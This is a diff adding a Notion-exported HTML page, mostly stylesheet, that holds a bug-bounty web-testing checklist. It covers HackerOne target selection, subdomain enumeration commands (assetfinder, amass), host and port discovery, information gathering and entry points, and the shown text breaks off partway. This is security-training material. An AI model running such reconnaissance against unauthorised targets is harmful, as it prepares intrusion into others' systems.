@@ -1,0 +1,1026 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Get Root Access</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+	/* Paint a complete callout box on every PDF page fragment. */
+	-webkit-box-decoration-break: clone;
+	box-decoration-break: clone;
+}
+
+/* For default-background callouts, render the border outline. */
+.callout.block-color-default_background {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+/*
+ * Toggles and callouts hold arbitrary content, so they can easily be taller
+ * than a page. They must stay breakable: avoiding breaks inside them makes
+ * Chromium push the whole block onto the next page, which leaves the previous
+ * page mostly empty before every long toggle.
+ */
+details,
+aside {
+	margin: 1.25em 0;
+}
+
+/* Keep a toggle's title on the same page as the start of its content. */
+summary {
+	page-break-after: avoid;
+	break-after: avoid;
+}
+
+/*
+ * Toggle headings render as <h1/h2/h3 style="display:inline-block"> inside
+ * <summary>. Without this reset, the heading's margin-top pushes it below the
+ * ::marker (▼), so the triangle and the title appear on separate lines.
+ */
+summary h1,
+summary h2,
+summary h3,
+summary h4 {
+	margin-top: 0;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding-inline: 0.125rem;
+	padding-block: 0.375rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+/*
+ * Render emoji icons using a ::before pseudo-element to keep the glyph
+ * out of the DOM textContent traversal. This avoids double-rendering icons
+ * in callouts and page titles.
+ * NOTE(slim/html-export-pseudo-icons): I can't tagref this because it will
+ * flag as a duplicate tag after codegen.
+ */
+.icon[data-emoji]::before {
+	content: attr(data-emoji);
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	margin-right: 0.4em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.tab {
+	margin: 1.25em 0;
+	padding-inline: 1rem;
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style><style>@import url('https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/katex-swap.min.css')</style></head><body><article id="134b0a6a-b787-805c-a0dc-caa42653eb5d" class="page sans"><header><h1 class="page-title" dir="auto">Get Root Access</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><hr id="134b0a6a-b787-809e-a5e9-e390f11edee3" dir="auto"/><p id="134b0a6a-b787-805a-b524-d60fc63adddf" class="" dir="auto"><mark class="highlight-teal" data-notion-highlight="teal">Udemy: </mark><a href="https://www.udemy.com/course/the-power-of-burp-suite-as-a-proxy/?referralCode=B7A88A3C703A0761C87E">https://www.udemy.com/course/the-power-of-burp-suite-as-a-proxy/?referralCode=B7A88A3C703A0761C87E</a></p><p id="134b0a6a-b787-8041-8cd3-ca94ee6fa2e6" class="" dir="auto">Black Box Vulnerability Scanner for hunting it will be helpful</p><p id="134b0a6a-b787-800f-8a82-fbc097d3e786" class="" dir="auto"><a href="https://github.com/wapiti-scanner/wapiti">https://github.com/wapiti-scanner/wapiti</a></p><details open="" class="" dir="auto"><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><h3 id="134b0a6a-b787-807c-b6b0-c3c04f8f6b6c" style="display:inline-block">Recon</h3></summary><div class="indented"><p id="134b0a6a-b787-8170-9846-d34b15db73cc" class="" dir="auto">We need to get that application target to start using most of the Hacks below, so we need to get the hosts running these applications we target.</p><ul id="134b0a6a-b787-81ce-bfb9-fa5cd617c5e1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Find a target hackerone. </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81aa-8f47-cb8ecb9185d4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Finding Subdomains</span><div class="indented"><ul id="134b0a6a-b787-81d4-900d-c8a98356bfa2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Google,Github, Shodan, Censys, CRT.sh, FindSubdomains</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8138-a2de-f69ab0e7a149" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><code>Subfinder</code>, <code>Amass</code></span><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js" integrity="sha512-m3JYEI6gx5fh9jF10FjGoMzVKcV2N6nchcDcqPCdI1L3R2WQV7br2XVNR8iTLb2daOMRl3zldbcfT40xU2ntVw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="134b0a6a-b787-8176-b701-c12b52e6f003" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">assetfinder --subs-only &lt;domain&gt;
+amass enum  -d target.com --passive | awk &#x27;{print $1}&#x27; | tee amass.txt</code></pre></div></li></ul></div></li></ul><ul id="134b0a6a-b787-81fa-8b26-db4150e670c3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Finding Resolving Applications</span><div class="indented"><ul id="134b0a6a-b787-8140-ace9-fe8bfbf62aa1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><code>httpx</code></span><div class="indented"></div></li></ul></div></li></ul><ul id="134b0a6a-b787-8150-862a-eb76d24c483d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Find Ports</span><div class="indented"><ul id="134b0a6a-b787-8151-ae72-ec5fc0f90268" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><code>naabu</code></span><div class="indented"></div></li></ul></div></li></ul><ul id="134b0a6a-b787-81c7-8650-f25eeb5f0f8c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Capture Screenshot</span><div class="indented"><ul id="134b0a6a-b787-8105-b29f-dc6878df2ecb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"></span><div class="indented"></div></li></ul></div></li></ul></div></details><details open="" class="" dir="auto"><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><h3 id="134b0a6a-b787-80a5-95d6-e966c7ec0693" style="display:inline-block"><strong>Information Gathering</strong></h3></summary><div class="indented"><ul id="134b0a6a-b787-81bd-a4da-c3c1c6c0c311" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Conduct <code>Search Engine</code> Discovery Reconnaissance for Information Leakage</span><div class="indented"><ul id="134b0a6a-b787-81c1-b14a-c66c89b5c08f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">using <code>google dorks</code>,<code>shodan</code>,<code>censys</code></span><div class="indented"></div></li></ul></div></li></ul><ul id="134b0a6a-b787-8110-877d-dd5d940d5398" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Fingerprint Web Server</span><div class="indented"><ul id="134b0a6a-b787-8141-8a4e-d8b87b30106c" class="bulleted-list" dir="auto"><li style="list-style-type:disc"> Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.</li></ul></div></li></ul><ul id="134b0a6a-b787-8192-b1e1-f50269c38d90" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Enumerate Applications on Webserver</span><div class="indented"><ul id="134b0a6a-b787-81b8-b383-ea42e29c432b" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Enumerate the applications within scope that exist on a web server.</li></ul></div></li></ul><ul id="134b0a6a-b787-8164-b240-cfa135041a23" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Review Webpage Content for Information Leakage</span><div class="indented"><ul id="134b0a6a-b787-81f1-8130-c2592ae6245a" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Review webpage comments and metadata to find any information leakage.</li></ul><ul id="134b0a6a-b787-81f6-b256-e7ee10f6be1e" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.</li></ul><ul id="134b0a6a-b787-813b-b108-c192c73ed1a0" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Identify if source map files or other front-end debug files exist.</li></ul></div></li></ul><ul id="134b0a6a-b787-81b9-b775-d131410eab5c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Identify application entry points</span><div class="indented"><ul id="134b0a6a-b787-814e-a12f-cd0adb24c839" class="bulleted-list" dir="auto"><li style="list-style-type:disc"> Identify possible entry and injection points through request and response analysis.</li></ul></div></li></ul><ul id="134b0a6a-b787-8168-8f14-de5bc49002c0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Map execution paths through application</span><div class="indented"><ul id="134b0a6a-b787-814d-a7dc-ef1c8e7ef09d" class="bulleted-list" dir="auto"><li style="list-style-type:disc">Map the target application and understand the principal workflows.</li></ul></div></li></ul><ul id="134b0a6a-b787-8113-95f3-f0ef73f2c13c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Fingerprint Web Application Framework</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-81dd-94ab-c6926aa2b412" class="" dir="auto">
+</p></div></details><details id="134b0a6a-b787-80b1-b549-fe4de05d8c5d" open="" class="toggle" dir="auto"><summary><strong>Application Entry Points</strong></summary><div class="indented"><ul id="134b0a6a-b787-81e7-87b6-eed995b6ba65" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Register</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817f-a8a5-e31e03a87e03" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Login</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-813e-a5e0-ceb3493d672a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Upload Functionality</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8108-8000-f0271c38ce7d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Search Box</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8112-b917-c3107f0ab08a" class="to-do-list" dir="auto"><li><input 